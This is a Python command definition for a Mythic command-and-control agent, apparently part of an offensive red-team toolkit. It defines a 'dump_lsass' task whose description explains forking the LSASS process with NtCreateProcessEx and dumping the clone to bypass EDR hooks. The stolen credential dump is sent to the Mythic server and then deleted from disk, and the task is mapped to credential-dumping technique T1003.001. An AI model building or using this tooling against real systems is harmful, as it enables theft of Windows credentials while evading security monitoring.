from mythic_container.MythicCommandBase import *
import json
from mythic_container.MythicRPC import *


class DumpLsassArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="output_path",
                type=ParameterType.String,
                parameter_group_info=[ParameterGroupInfo(required=False)],
                description="Caminho de saída do dump (padrão: %TEMP%\\forked_lsass.dmp)",
            )
        ]

    async def parse_arguments(self):
        if self.command_line:
            if self.command_line.strip().startswith('{'):
                temp = json.loads(self.command_line)
                self.add_arg("output_path", temp.get("output_path", ""))
            else:
                self.add_arg("output_path", self.command_line.strip())
        else:
            self.add_arg("output_path", "")


class DumpLsassCommand(CommandBase):
    cmd         = "dump_lsass"
    needs_admin = True
    help_cmd    = "dump_lsass [output_path]"
    description = (
        "Clona o processo LSASS via NtCreateProcessEx (process fork) e executa "
        "MiniDumpWriteDump no clone (PID 0), não no LSASS original. "
        "Bypassa hooks de EDR que filtram dumps por PID do LSASS. "
        "O dump é enviado ao Mythic e removido do disco. "
        "Requer SeDebugPrivilege (agente elevado)."
    )
    version               = 1
    author                = "@anubis"
    attackmapping         = ["T1003.001"]
    supported_ui_features = []
    argument_class        = DumpLsassArguments
    attributes            = CommandAttributes(
        supported_python_versions=["Python 3.8"],
        supported_os=[SupportedOS.Windows],
    )

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        out = task.args.get_arg("output_path")
        task.display_params = out if out else "%TEMP%\\forked_lsass.dmp"
        return task

    async def process_response(
        self, task: PTTaskMessageAllData, response: any
    ) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        return resp
